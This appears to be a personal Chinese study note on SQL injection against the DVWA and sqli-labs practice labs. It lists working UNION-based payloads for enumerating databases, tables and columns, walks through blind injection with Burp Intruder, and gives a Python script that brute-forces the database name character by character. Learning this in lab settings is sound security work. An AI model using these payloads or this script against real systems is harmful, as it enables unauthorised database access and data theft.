### 											Summary SQLInjection Attack

SQL是一种弱类型的语言.1 与 ‘1’ 是可以匹配的.

‘ ’+0+‘ ’与字符‘0’或者字母开头的字符串匹配.

‘ ’+5+‘ ’与字符‘5’开头的相匹配.

SQL注入漏洞一般的格式为

```mysql
-1' payload-- ;
```

用于回显该查询语句的某些特定列的情况。

而

```mysql
-1';payload-- ;
```

用于能够回显所有查询结果的情况。

其中, -1’用于闭合第一句查询, 后边的payload执行你想要的查询语句。注释符负责绕过后边的条件检查。

现在给出一些常用的注入语句。

```mysql
#用于判断查询的列数
-1' ORDER BY n-- ;

#回显该表中所有待查询列的信息
-1' or 1=1-- ;

#用于查看哪些列会回显
-1' UNION SELECT 1,2,3-- ;

#泄露所有的数据库名信息
-1' UNION SELECT 1,2,group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA-- ;

#回显某数据库下的所有表名
-1' UNION SELECT 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='DATABASE_NAME'-- ;

#回显某表下的所有列名
-1' UNION SELECT 1,2,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='TABLE_NAME'-- ;

#回显表中某两列的信息
-1' UNION SELECT 1,COLUMN_NAME1, COLUMN_NAME2 FROM 'TABLE_NAME'-- ; 

```

### 利用盲注爆破

利用

```mysql
LEFT(str, len)
```

爆破某些特定的信息,如

```mysql
user();# 当前数据库用户
database(); #当前数据库名
version(); #当前使用的数据库版本
```

下面以DVWA的SQL注入为例谈谈如何使用burpsuite的Intruder模块逐字节爆破出特定的信息.

我们想要拿到当前数据库的名字，我们可以构造参数

#### GET

```http
id=1'+and+left(database(),1)='§a§'--+;
```

接着设置字符集与爆破长度:

![image-20240330224238605](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240330224238605.png)

查看攻击结果, 我们拿到了第一个字符s

![image-20240330224348504](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240330224348504.png)

爆破第二位时, 我们接着构造payload:

![image-20240330224624622](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240330224624622.png)

```http
id=1'+and+left(database(),2)='s§a§'--+;
```

接着爆破得到结论:
![image-20240330224703692](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240330224703692.png)

第二位字符是e, 以此类推.

可以利用python脚本完成盲注:

```python
import requests
from Crypto.Util import number
import time

URL = "http://localhost/sqli-labs/Less-5/?id="

sql_payload1 = "SELECT database()";

sql_payload2 = "SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'"


def explode(sqlPayload, num, data):  # payload 第几位 已经爆破出来的字节
    payload = "1' and left(({sqlPayload}),{num}) = '{data}{char}'-- ;";
    for i in range(32, 127):
        payloadTmp = payload.format(sqlPayload=sqlPayload, num=num, data=data, char=chr(i));
        r = requests.get(URL + payloadTmp)
        if ("You are in" in r.text):  # 查到了东西
            return chr(i)


data = ''

payloadNow = "database()"

for i in range(1, 100):
    data += explode(payloadNow, i, data)
    print(data)

```

![image-20240330231556776](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240330231556776.png)

我们爆破出了完整的内容;
